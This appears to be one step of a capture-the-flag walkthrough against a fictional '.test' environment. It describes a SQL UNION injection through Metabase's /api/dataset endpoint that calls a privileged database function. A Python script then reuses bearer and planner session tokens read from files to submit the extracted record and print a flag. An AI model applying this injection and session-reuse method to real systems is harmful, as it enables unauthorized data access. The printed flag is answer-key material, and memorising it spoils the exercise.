Requires W11.2 (asset identity from UNION injection via Metabase). The old Bolt facade endpoint `/api/asset-lineage/current` is retired (410). The lineage `LIN-AST-CRR-017-R8` sits behind the SECURITY DEFINER function `get_asset_lineage()`. Reach it with the same native Metabase `/api/dataset` injection as W11.2, calling `get_asset_lineage('AST-CRR-017')` in the UNION; the row gives `relation = CRR-OG-LEGACY-2 -> OG-CRR-02 -> AST-CRR-017 -> ARC-COLD-CRR-2019`. Then submit the recovered lineage record to the completion endpoint below.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planner = pathlib.Path("receipts/planner-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planner-Session": planner, "Content-Type": "application/json"}

# Submit the lineage record linking AST-CRR-017 to cold archive ARC-COLD-CRR-2019
body = json.dumps({
    "record_id": "LIN-AST-CRR-017-R8",
    "asset": "AST-CRR-017",
    "archive": "ARC-COLD-CRR-2019",
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/api/lineage-records/current",
                            data=body, headers=h, method="POST"),
    context=ctx).read())
rec = d["record"]
print("record_id:", rec["record_id"])   # LIN-AST-CRR-017-R8
print("flag:", d["flag"])               # FLAG{8790fcf0e1a1dd6a}
```
